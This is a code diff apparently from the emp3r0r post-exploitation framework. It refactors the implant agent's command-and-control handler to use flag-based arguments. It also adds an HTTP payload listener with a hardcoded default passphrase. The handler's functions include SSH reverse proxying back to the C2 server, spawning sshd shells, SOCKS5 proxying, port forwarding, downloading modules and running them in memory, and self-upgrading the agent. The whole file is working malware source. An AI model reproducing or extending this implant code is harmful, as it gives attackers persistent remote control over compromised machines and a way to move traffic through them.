@@ -6,69 +6,77 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"strconv"
-	"strings"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/listener"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/spf13/pflag"
 )
 
 func C2CommandsHandler(cmdSlice []string) (out string) {
 	var err error
 
+	// parse command-line arguments using pflag
+	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
+	flags.Parse(cmdSlice[1:])
+
 	switch cmdSlice[0] {
 
 	// stat file
-	// !stat '/path/to/a file name.txt'
+	// Usage: !stat --path <path>
+	// Retrieves file statistics for the specified path.
 	case emp3r0r_data.C2CmdStat:
-		if len(cmdSlice) < 2 {
+		path := flags.StringP("path", "p", "", "Path to stat")
+		flags.Parse(cmdSlice[1:])
+		if *path == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 
-		path := strings.Join(cmdSlice[1:], " ")
-		fi, err := os.Stat(path)
+		fi, err := os.Stat(*path)
 		if err != nil || fi == nil {
-			out = fmt.Sprintf("Error: cant stat file %s: %v", path, err)
+			out = fmt.Sprintf("Error: cant stat file %s: %v", *path, err)
 			return
 		}
 		fstat := &util.FileStat{}
-		fstat.Name = util.FileBaseName(path)
+		fstat.Name = util.FileBaseName(*path)
 		fstat.Size = fi.Size()
-		fstat.Checksum = tun.SHA256SumFile(path)
+		fstat.Checksum = tun.SHA256SumFile(*path)
 		fstat.Permission = fi.Mode().String()
 		fiData, err := json.Marshal(fstat)
 		out = string(fiData)
 		if err != nil {
-			out = fmt.Sprintf("Error: cant marshal file info %s: %v", path, err)
+			out = fmt.Sprintf("Error: cant marshal file info %s: %v", *path, err)
 		}
 		return
 
-		// !bring2cc target_agent_ip
+	// !bring2cc --addr target_agent_ip
+	// Usage: !bring2cc --addr <target_agent_ip>
+	// Sets up a reverse proxy to the specified agent IP address.
 	case emp3r0r_data.C2CmdBring2CC:
-		// reverse proxy
-		if len(cmdSlice) != 2 {
+		addr := flags.StringP("addr", "a", "", "Target agent IP address")
+		flags.Parse(cmdSlice[1:])
+		if *addr == "" {
 			out = fmt.Sprintf("Error args error: %v", cmdSlice)
 			return
 		}
-		addr := cmdSlice[1]
-		out = "Bring2CC: Reverse proxy for " + addr + " finished"
+		out = "Bring2CC: Reverse proxy for " + *addr + " finished"
 
-		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress)
+		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
 		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
 		if !hasInternet && !isProxyOK {
 			out = "Error: We don't have any internet to share"
 		}
 		for p, cancelfunc := range ReverseConns {
-			if addr == p {
+			if *addr == p {
 				cancelfunc() // cancel existing connection
 			}
 		}
-		addr += ":" + RuntimeConfig.SSHProxyPort
+		addrWithPort := *addr + ":" + RuntimeConfig.SSHProxyPort
 		ctx, cancel := context.WithCancel(context.Background())
-		if err = tun.SSHReverseProxyClient(addr, RuntimeConfig.Password,
+		if err = tun.SSHReverseProxyClient(addrWithPort, RuntimeConfig.Password,
 			&ReverseConns,
 			emp3r0r_data.ProxyServer,
 			ctx, cancel); err != nil {
@@ -76,45 +84,57 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		return
 
+	// Usage: !sshd --shell <shell> --port <port> --args <args>
+	// Starts an SSHD server with the specified shell, port, and arguments.
 	case emp3r0r_data.C2CmdSSHD:
-		// sshd server
-		// !sshd id shell port args
-		log.Printf("Got sshd request: %s", cmdSlice)
-		if len(cmdSlice) < 3 {
+		shell := flags.StringP("shell", "s", "", "Shell to use")
+		port := flags.StringP("port", "p", "", "Port to use")
+		args := flags.StringSliceP("args", "a", []string{}, "Arguments for SSHD")
+		flags.Parse(cmdSlice[1:])
+		if *shell == "" || *port == "" {
 			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
 			log.Print(out)
 			return
 		}
-		shell := cmdSlice[1]
-		port := cmdSlice[2]
-		args := cmdSlice[3:]
+		log.Printf("Got sshd request: %s", cmdSlice)
+
+		errChan := make(chan error)
+
 		go func() {
-			out = "success"
-			err = SSHD(shell, port, args)
+			errChan <- SSHD(*shell, *port, *args)
+		}()
+
+		// wait for SSHD to start
+		for !tun.IsPortOpen("127.0.0.1", *port) {
+			time.Sleep(100 * time.Millisecond)
+		}
+
+		select {
+		case err = <-errChan:
 			if err != nil {
 				out = fmt.Sprintf("Error: %v", err)
+			} else {
+				out = "success"
 			}
-		}()
-		for !tun.IsPortOpen("127.0.0.1", port) {
-			time.Sleep(100 * time.Millisecond)
-			if err != nil {
-				out = fmt.Sprintf("Error: sshd failed to start: %v\n%s", err, out)
-				break
-			}
+		case <-time.After(3 * time.Second):
+			out = "SSHD started successfully"
 		}
 		return
 
-		// proxy server
-		// !proxy on 0.0.0.0:12345
+	// !proxy --mode on --addr 0.0.0.0:12345
+	// Usage: !proxy --mode <mode> --addr <address>
+	// Starts a Socks5 proxy server with the specified mode and address.
 	case emp3r0r_data.C2CmdProxy:
-		if len(cmdSlice) != 3 {
+		mode := flags.StringP("mode", "m", "", "Proxy mode")
+		addr := flags.StringP("addr", "a", "", "Address to bind")
+		flags.Parse(cmdSlice[1:])
+		if *mode == "" || *addr == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			log.Print(out)
 			return
 		}
 		log.Printf("Got proxy request: %s", cmdSlice)
-		addr := cmdSlice[2]
-		err = Socks5Proxy(cmdSlice[1], addr)
+		err = Socks5Proxy(*mode, *addr)
 		if err != nil {
 			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
 		}
@@ -123,18 +143,26 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			RuntimeConfig.Password)
 		return
 
-		// port fwd
-		// cmd format: !port_fwd [to/listen] [shID] [operation/protocol] [timeout]
+	// !port_fwd --to/listen [to/listen] --shID [shID] --operation/protocol [operation/protocol] --timeout [timeout]
+	// Usage: !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
+	// Sets up port forwarding with the specified parameters.
 	case emp3r0r_data.C2CmdPortFwd:
-		if len(cmdSlice) < 4 {
+		to := flags.StringP("to", "t", "", "Target address")
+		sessionID := flags.StringP("shID", "s", "", "Session ID")
+		operation := flags.StringP("operation", "o", "", "Operation type")
+		timeout := flags.IntP("timeout", "T", 0, "Timeout")
+		flags.Parse(cmdSlice[1:])
+		if *to == "" || *sessionID == "" || *operation == "" {
 			out = fmt.Sprintf("Error: Invalid command: %v", cmdSlice)
 			return
 		}
 		out = "success"
-		switch cmdSlice[3] {
+
+		errChan := make(chan error)
+
+		switch *operation {
 		case "stop":
-			sessionID := cmdSlice[1]
-			pf, exist := PortFwds[sessionID]
+			pf, exist := PortFwds[*sessionID]
 			if exist {
 				pf.Cancel()
 				out = fmt.Sprintf("Warning: port mapping %s stopped", pf.Addr)
@@ -143,74 +171,114 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
 		case "reverse":
 			go func() {
-				addr := cmdSlice[1]
-				sessionID := cmdSlice[2]
-				err = PortFwd(addr, sessionID, "tcp", true, 0)
-				if err != nil {
-					out = fmt.Sprintf("Error: PortFwd (reverse) failed: %v", err)
-				}
+				errChan <- PortFwd(*to, *sessionID, "tcp", true, 0)
 			}()
 		default:
 			go func() {
-				to := cmdSlice[1]
-				sessionID := cmdSlice[2]
-				protocol := cmdSlice[3]
-				timeout := 0
-				if len(cmdSlice) == 5 {
-					timeout, _ = strconv.Atoi(cmdSlice[4])
-				}
-
-				err = PortFwd(to, sessionID, protocol, false, timeout)
-				if err != nil {
-					out = fmt.Sprintf("Error: PortFwd failed: %v", err)
-				}
+				errChan <- PortFwd(*to, *sessionID, *operation, false, *timeout)
 			}()
 		}
 
+		select {
+		case err = <-errChan:
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+			}
+		case <-time.After(3 * time.Second):
+			out = "Port forwarding started successfully"
+		}
 		return
 
-		// delete_portfwd
-		// !delete_portfwd id
+	// !delete_portfwd --id id
+	// Usage: !delete_portfwd --id <session_id>
+	// Deletes the specified port forwarding session.
 	case emp3r0r_data.C2CmdDeletePortFwd:
-		if len(cmdSlice) != 2 {
+		id := flags.StringP("id", "i", "", "Session ID")
+		flags.Parse(cmdSlice[1:])
+		if *id == "" {
 			return
 		}
-		for id, session := range PortFwds {
-			if id == cmdSlice[1] {
+		for sessionID, session := range PortFwds {
+			if sessionID == *id {
 				session.Cancel()
 			}
 		}
 		return
 
-		// download utils
+	// !utils
+	// Usage: !utils
+	// Executes utility functions on the agent.
 	case emp3r0r_data.C2CmdUtils:
 		out = VaccineHandler()
 		if out != "[+] Utils have been successfully installed" {
 			out = fmt.Sprintf("Error: %s", out)
 		}
-
 		return
 
-		// download a module and run it
-		// !custom_module mod_name checksum
+	// !custom_module --mod_name mod_name --checksum checksum
+	// Usage: !custom_module --mod_name <module_name> --checksum <checksum> --in_mem <in_memory>
+	// Loads a custom module with the specified name and checksum.
 	case emp3r0r_data.C2CmdCustomModule:
-		if len(cmdSlice) != 3 {
+		modName := flags.StringP("mod_name", "m", "", "Module name")
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
+		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
+		flags.Parse(cmdSlice[1:])
+		if *modName == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		out = moduleHandler(cmdSlice[1], cmdSlice[2])
+		out = moduleHandler(*modName, *checksum, *inMem)
 		return
 
-		// upgrade
-		// !upgrade_agent checksum
+	// !upgrade_agent --checksum checksum
+	// Usage: !upgrade_agent --checksum <checksum>
+	// Upgrades the agent with the specified checksum.
 	case emp3r0r_data.C2CmdUpdateAgent:
-		if len(cmdSlice) != 2 {
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
+		flags.Parse(cmdSlice[1:])
+		if *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
+		out = Upgrade(*checksum)
+		return
 
-		checksum := cmdSlice[1]
-		out = Upgrade(checksum)
+	// !listener --listener listener --port port --payload payload --compression on/off --passphrase passphrase
+	case emp3r0r_data.C2CmdListener:
+		listener_type := flags.StringP("listener", "l", "http_aes_compressed", "Listener")
+		port := flags.StringP("port", "p", "8000", "Port")
+		payload := flags.StringP("payload", "P", "", "Payload")
+		compression := flags.StringP("compression", "c", "on", "Compression")
+		passphrase := flags.StringP("passphrase", "s", "my_secret_key", "Passphrase")
+		flags.Parse(cmdSlice[1:])
+
+		if *payload == "" {
+			out = fmt.Sprintf("Error: payload not specified: %v", cmdSlice)
+			return
+		}
+		log.Printf("Got listener request: %v", cmdSlice)
+
+		errChan := make(chan error)
+
+		if *listener_type == "http_aes_compressed" {
+			go func() {
+				errChan <- listener.HTTPAESCompressedListener(*payload, *port, *passphrase, *compression == "on")
+			}()
+		}
+		if *listener_type == "http_bare" {
+			go func() {
+				errChan <- listener.HTTPBareListener(*payload, *port)
+			}()
+		}
+
+		select {
+		case err = <-errChan:
+			if err != nil {
+				out = fmt.Sprintf("Error: %v", err)
+			}
+		case <-time.After(3 * time.Second):
+			out = "Listener started successfully"
+		}
 		return
 
 	default:
